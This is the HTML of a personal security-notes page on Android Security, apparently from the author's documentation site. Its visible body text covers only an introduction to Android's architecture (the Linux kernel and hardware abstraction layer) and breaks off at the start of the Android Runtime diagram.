
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://ashok5141.github.io/MobileSec/Android/">
      
      
        <link rel="prev" href="../../DevSecOps/Kubernetes/">
      
      
        <link rel="next" href="../Iphone/">
      
      
        
      
      
      <link rel="icon" href="../../assets/a.ico">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
    
    
      
        <title>Android Security - Ashok Documentation</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#android-security" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Ashok Documentation" class="md-header__button md-logo" aria-label="Ashok Documentation" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Ashok Documentation
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Android Security
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="deep-orange"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Ashok Documentation" class="md-nav__button md-logo" aria-label="Ashok Documentation" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Ashok Documentation
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Introduction
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../EmailSecurity/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    EmailSecurity
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Formats/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Welcome to MkDocs
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gym/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    ðŸš€ Ashok's 30-Day Lean &amp; Chiseled Plan
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../OKTA/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Okta
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    AI Security
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            
  
    AI Security
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../AI%20Security/Prompt%20Injection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Prompt Injection
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    DevSecOps
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            
  
    DevSecOps
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../DevSecOps/Kubernetes/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Kubernetes
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" checked>
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    MobileSec
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            
  
    MobileSec
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    Android Security
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    Android Security
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#android-architecture" class="md-nav__link">
    <span class="md-ellipsis">
      
        Android Architecture
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Android Architecture">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#linux-kernel" class="md-nav__link">
    <span class="md-ellipsis">
      
        Linux Kernel
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hardware-abstraction-layer-hal" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hardware abstraction layer (HAL)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#android-runtime" class="md-nav__link">
    <span class="md-ellipsis">
      
        Android Runtime
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libraries" class="md-nav__link">
    <span class="md-ellipsis">
      
        Libraries
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java-api-framework" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java API Framework
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#system-apps" class="md-nav__link">
    <span class="md-ellipsis">
      
        System Apps
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#androind-static-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      
        Androind Static Analysis
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hacking-android-webviews" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hacking Android WebViews
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Hacking Android WebViews">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#webview-vulnerabilities-via-the-apps-code" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebView Vulnerabilities via the app's code ?
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#static-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      
        Static Analysis
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Static Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mobsf-android" class="md-nav__link">
    <span class="md-ellipsis">
      
        MobSF Android
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#static-analysis-tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Static analysis Tools
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shared-preferences-other-data-storage-options" class="md-nav__link">
    <span class="md-ellipsis">
      
        Shared Preferences &amp; Other Data Storage options
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hardcoded-credentials" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hardcoded Credentials
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#drozer" class="md-nav__link">
    <span class="md-ellipsis">
      
        Drozer
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#firebase-real-time-database" class="md-nav__link">
    <span class="md-ellipsis">
      
        Firebase Real-time Database
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pasteboard" class="md-nav__link">
    <span class="md-ellipsis">
      
        Pasteboard
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hot-patchingenforced-updating" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hot Patching/Enforced Updating
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webview-related-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebView Related Vulnerabilities
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dynamic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      
        Dynamic Analysis
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Dynamic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#adb" class="md-nav__link">
    <span class="md-ellipsis">
      
        ADB
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypass-root-detection-using-frida-objection" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bypass Root Detection using Frida, Objection
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssl-pinning-fringerprint-bypass-using-frida-objection" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSL Pinning &amp; Fringerprint Bypass using Frida, Objection
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#non-rooted-frida-and-objection" class="md-nav__link">
    <span class="md-ellipsis">
      
        Non Rooted Frida and Objection
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#progressive-web-application-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Progressive Web Application Attacks
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#demo" class="md-nav__link">
    <span class="md-ellipsis">
      
        Demo
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Demo">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bug-bunty-tips" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bug bunty tips
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#android-file-structure" class="md-nav__link">
    <span class="md-ellipsis">
      
        Android File Structure
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Iphone/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Iphone Security
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Mobile-Security-Basics/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    OWASP Mobile Top 10
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    ThreatModeling
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            
  
    ThreatModeling
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ThreatModeling/SecureDesign/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SecureDesign
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ThreatModeling/Threat-Modelling/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Threat Modelling
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Appsec
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            
  
    Appsec
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../appsec/API-Security/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    API Security
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../appsec/WAHH/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    WAHH
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../appsec/xss/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Xss
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#android-architecture" class="md-nav__link">
    <span class="md-ellipsis">
      
        Android Architecture
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Android Architecture">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#linux-kernel" class="md-nav__link">
    <span class="md-ellipsis">
      
        Linux Kernel
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hardware-abstraction-layer-hal" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hardware abstraction layer (HAL)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#android-runtime" class="md-nav__link">
    <span class="md-ellipsis">
      
        Android Runtime
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libraries" class="md-nav__link">
    <span class="md-ellipsis">
      
        Libraries
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java-api-framework" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java API Framework
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#system-apps" class="md-nav__link">
    <span class="md-ellipsis">
      
        System Apps
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#androind-static-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      
        Androind Static Analysis
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hacking-android-webviews" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hacking Android WebViews
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Hacking Android WebViews">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#webview-vulnerabilities-via-the-apps-code" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebView Vulnerabilities via the app's code ?
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#static-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      
        Static Analysis
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Static Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mobsf-android" class="md-nav__link">
    <span class="md-ellipsis">
      
        MobSF Android
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#static-analysis-tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Static analysis Tools
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shared-preferences-other-data-storage-options" class="md-nav__link">
    <span class="md-ellipsis">
      
        Shared Preferences &amp; Other Data Storage options
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hardcoded-credentials" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hardcoded Credentials
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#drozer" class="md-nav__link">
    <span class="md-ellipsis">
      
        Drozer
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#firebase-real-time-database" class="md-nav__link">
    <span class="md-ellipsis">
      
        Firebase Real-time Database
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pasteboard" class="md-nav__link">
    <span class="md-ellipsis">
      
        Pasteboard
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hot-patchingenforced-updating" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hot Patching/Enforced Updating
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#webview-related-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      
        WebView Related Vulnerabilities
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dynamic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      
        Dynamic Analysis
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Dynamic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#adb" class="md-nav__link">
    <span class="md-ellipsis">
      
        ADB
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypass-root-detection-using-frida-objection" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bypass Root Detection using Frida, Objection
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssl-pinning-fringerprint-bypass-using-frida-objection" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSL Pinning &amp; Fringerprint Bypass using Frida, Objection
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#non-rooted-frida-and-objection" class="md-nav__link">
    <span class="md-ellipsis">
      
        Non Rooted Frida and Objection
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#progressive-web-application-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      
        Progressive Web Application Attacks
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#demo" class="md-nav__link">
    <span class="md-ellipsis">
      
        Demo
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Demo">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bug-bunty-tips" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bug bunty tips
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#android-file-structure" class="md-nav__link">
    <span class="md-ellipsis">
      
        Android File Structure
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="android-security">Android Security</h1>
<ul>
<li>Android, based on the <code>Linux kernel</code>, is a mobile operating system. Discovered by Android Inc., acquired by Google.</li>
</ul>
<h2 id="android-architecture">Android Architecture</h2>
<ul>
<li>Android is an open source, Linux-based software stack created for a wide array of devices and form factors. <a href="https://developer.android.com/guide/platform">Credits</a>
<img alt="Anroid Architecture" src="/assets/AndroidArchitecture.png" /></li>
</ul>
<h5 id="linux-kernel">Linux Kernel</h5>
<ul>
<li>The foundation for the Android platform is the Linux kernel, Android Runtime(ART) relies on the Linux kernel for underlying functionalities such as threading and low-level memory management.</li>
<li>This kernel lets android take advatage of the <a href="https://source.android.com/security/overview/kernel-security.html">key security features</a> and lets device manufactures develop hardware drivers for a well-known kernel. </li>
</ul>
<h5 id="hardware-abstraction-layer-hal">Hardware abstraction layer (HAL)</h5>
<ul>
<li>The HAL provides standard interfaces that expose device specific modules including camera, Bluetooth, Sensor.</li>
</ul>
<h5 id="android-runtime">Android Runtime</h5>
<pre class="mermaid"><code>graph LR
